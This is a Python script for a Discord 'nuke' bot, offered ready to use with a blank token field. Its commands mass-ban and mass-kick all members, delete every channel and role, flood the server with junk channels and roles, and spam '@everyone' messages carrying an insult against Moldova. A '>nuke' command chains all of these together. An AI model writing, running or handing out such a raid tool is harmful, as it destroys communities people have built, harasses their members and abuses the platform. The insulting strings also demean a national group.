# Add your bot token at line 16

import os
import discord
import asyncio
import datetime
import requests
from discord.ext import commands
import colorama
from colorama import Fore, Back, Style

intents = discord.Intents().all()
intents.members = True


TOKEN = ''
prefix = '>'

CHANNEL_NAME = "Sall Server"
BAN_REASON = "Muie Moldova"
KICK_REASON = "Muie Moldavia"
SPAM_MESSAGE = "@everyone Muie Moldavia"
ROLES_NAMES = "Muie Moldavia lmfao"


def clear():
    os.system('cls')

def banner():
    print(f'''{Fore.RED}
    |  \  |  \          |  \                      |       \            |  \    
    | $$\ | $$ __    __ | $$   __   ______        | $$$$$$$\  ______  _| $$_   
    | $$$\| $$|  \  |  \| $$  /  \ /      \       | $$__/ $$ /      \|   $$ \  
    | $$$$\ $$| $$  | $$| $$_/  $$|  $$$$$$\      | $$    $$|  $$$$$$\\$$$$$$  
    | $$\$$ $$| $$  | $$| $$   $$ | $$    $$      | $$$$$$$\| $$  | $$ | $$ __ 
    | $$ \$$$$| $$__/ $$| $$$$$$\ | $$$$$$$$      | $$__/ $$| $$__/ $$ | $$|  \
    | $$  \$$$ \$$    $$| $$  \$$\ \$$     \      | $$    $$ \$$    $$  \$$  $$
    \$$   \$$  \$$$$$$  \$$   \$$  \$$$$$$$       \$$$$$$$   \$$$$$$    \$$$$ 
                                                                                    
                                                                                {Fore.GREEN} Made by Sync#5666''')

bot = commands.Bot(case_insensitive=True, command_prefix= prefix, intents = intents)
bot.remove_command("help")

@bot.event
async def on_ready():
  print(f"{bot.user.name} is ready.")
  clear()
  banner()

@bot.command()
async def help(ctx):
    await ctx.send('">kall" kick all, ">ball" ban all, ">spam" spam every channel, ">rd" delete all the roles, ">dc" delete channels, ">sc" spam channels, ">rc" spam roles ">nuke" all previus')


@bot.command()
async def kall(ctx):
    guild = ctx.guild
    for member in guild.members:
        try:
            await member.kick(reason=KICK_REASON)
            print(f'{Fore.GREEN} {member} has been kicked.')
        except:
            print(f'{Fore.RED} {member} Could not be kicked.')
            pass


@bot.command()
async def ball(ctx):
    guild = ctx.guild
    for member in guild.members:
        try:
            await member.ban(reason=BAN_REASON)
            print(f'{Fore.GREEN} {member} has been banned.')
        except:
            print(f'{Fore.RED} {member} Could not be banned.')
            pass

@bot.command()
async def spam(ctx):
    guild = ctx.guild
    for i in range(50):
        for channel in guild.channels:
            try:
                await channel.send(SPAM_MESSAGE)
            except:
                pass


@bot.command()
async def rd(ctx):
    guild = ctx.guild
    for role in guild.roles:
        try:
            await role.delete()
            print(f'{Fore.GREEN} {role} has been deleted.')
        except:
            print(f'{Fore.RED} {role} could not be deleted.')
            pass

@bot.command()
async def dc(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        try:
            channel.delete()
            print(f'{Fore.GREEN} {channel} has been deleted')
        except:
            print(f'{Fore.RED} {channel} Could not be deleted.')
            pass


@bot.command()
async def sc(ctx):
    guild = ctx.guild
    for x in range(25):
        await guild.create_text_channel(CHANNEL_NAME)


@bot.command()
async def rc(ctx):
    guild = ctx.guild
    for x in range(50):
        await guild.create_role(ROLES_NAMES)


@bot.command()
async def nuke(ctx):
    guild = ctx.guild

    for member in guild.members:
        try:
            await member.ban(reason=BAN_REASON)
            print(f'{Fore.GREEN} {member} has been banned!')
        except:
            print(f'{Fore.RED} {member} could not be banned.')
            pass

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'{Fore.GREEN} {channel} has been deleted!')
        except:
            print(f'{Fore.RED} {channel} could not be deleted.')
            pass

    for i in range(50):
        await guild.create_text_channel(CHANNEL_NAME)
        print('Channel has been created.')

    for role in guild.roles:
        try:
            await role.delete()
            print(f'{Fore.GREEN} {role} has been deleted.')
        except:
            print(f'{Fore.RED} {role} could not be deleted.')
            pass

    for i in range(25):
        try:
            await guild.create_role(ROLES_NAMES)
        except:
            pass

    for x in range(300):
        for channel in guild.channels:
            try:
                await channel.send(SPAM_MESSAGE)
            except:
                pass


bot.run(TOKEN)